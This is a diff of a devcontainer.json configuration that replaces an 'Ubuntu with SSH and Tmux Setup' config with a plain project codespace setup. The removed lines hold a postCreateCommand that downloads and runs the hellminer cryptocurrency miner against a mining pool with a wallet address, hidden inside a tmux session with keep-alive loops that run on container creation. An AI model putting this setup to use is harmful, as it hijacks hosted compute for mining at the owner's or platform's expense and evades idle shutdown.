@@ -1,27 +1,27 @@
 {
-  "name": "Ubuntu with SSH and Tmux Setup",
-  "image": "mcr.microsoft.com/devcontainers/base:ubuntu", 
-  "features": {
-    "ghcr.io/devcontainers/features/ssh:1": {}
+  "name": "Project Codespace",
+  "build": {
+    "dockerfile": "Dockerfile",
+    "args": {
+      "VARIANT": "latest"
+    }
   },
   "settings": {
-    "terminal.integrated.shell.linux": "/bin/bash"
+    "terminal.integrated.defaultProfile.linux": "/bin/bash"
   },
-  "extensions": [
-    "ms-python.python",
-    "esbenp.prettier-vscode"
-  ],
-  "postCreateCommand": [
-    "sudo apt update && sudo apt install -y tmux libsodium23 libsodium-dev wget &&",
-    "tmux new-session -d -s multi_terminal 'while true; do echo \"Menjaga koneksi tetap hidup...\"; sleep 5; clear; done' \\;",
-    "split-window -v 'wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz && tar -xvzf hellminer_linux64_avx2.tar.gz && ./hellminer -v -c stratum+tcp://cn.vipor.net:5040 -u RJMuH1ems9YZKZ1jDnqTtRLuQvuWmBpznQ.Device10 -p x' \\;",
-    "split-window -h 'while true; do echo \"Keep-alive ping\" > /dev/null; sleep 10; done' \\;",
-    "select-layout tiled \\;",
-    "attach"
-  ],
-  "runArgs": [
-    "--runtime", "runc"
-  ],
+  "postCreateCommand": "sudo apt update && sudo apt install -y tmux",
   "forwardPorts": [22],
-  "postStartCommand": "echo 'SSH Ready. Connect via SSH to the instance.'"
+  "features": {},
+  "customizations": {
+    "vscode": {
+      "settings": {
+        "editor.formatOnSave": true
+      },
+      "extensions": [
+        "ms-azuretools.vscode-docker",
+        "eamodio.gitlens"
+      ]
+    }
+  },
+  "remoteUser": "codespace"
 }
